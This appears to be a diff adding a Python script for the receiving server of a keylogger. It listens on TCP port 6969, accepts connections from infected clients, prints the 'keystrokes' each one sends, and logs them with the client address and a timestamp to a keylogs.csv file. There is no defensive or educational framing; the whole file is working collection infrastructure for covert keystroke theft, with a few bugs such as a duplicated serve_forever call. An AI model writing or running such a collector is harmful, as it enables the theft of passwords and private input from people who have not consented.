@@ -1,0 +1,71 @@
+#!/bin/python
+
+import evdev
+from os import getenv
+from socketserver import *
+from select import select
+from threading import Thread, current_thread
+import logging
+import threading
+from datetime import datetime
+
+import socket
+import pandas as pd
+import time
+
+def log_csv(ip_cli, ipt):
+    filename='keylogs.csv'
+
+    if not ip_cli:
+        return
+
+    df = pd.DataFrame({ip_cli: [ipt]})
+    try:
+        old_df = pd.read_csv(filename).fillna(0)
+        df = pd.concat([df, old_df]).fillna(0)
+    except FileNotFoundError:
+        open(filename, "w+").close()
+    finally:
+        df.to_csv(filename)
+
+
+class TCPHandler(BaseRequestHandler):
+    def handle(self):
+        client = self.request.getpeername()
+        ip_cli = f'{client[0]}:{client[1]}'
+        log_csv(ip_cli, "NEW CONNEXION")
+        while True:
+            try:
+                data = self.request.recv(1024)
+            except (ConnectionResetError, BrokenPipeError):
+                print(f'[+] {ip_cli} disconnected.')
+                log_csv(ip_cli, 'KO')
+                return
+
+            if not data:
+                continue
+            cur_time = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
+            print(f'[+] {cur_time}: Received new keystrokes from {ip_cli}:{data}')
+            log_csv(ip_cli, f'{data}\n{cur_time}')
+
+
+class Server(ThreadingMixIn, TCPServer):
+    daemon_threads = True
+    allow_reuse_address = True
+    poll_interval = 0.5
+
+
+if __name__ == '__main__':
+    HOST = ''
+    PORT = 6969
+
+    with Server((HOST, PORT), TCPHandler) as server:
+        ip, port = server.server_address
+        server_thread = Thread(target=server.serve_forever)
+        server_thread.start()
+
+        try:
+            server.serve_forever()
+        except KeyboardInterrupt:
+            server.shutdown()
+
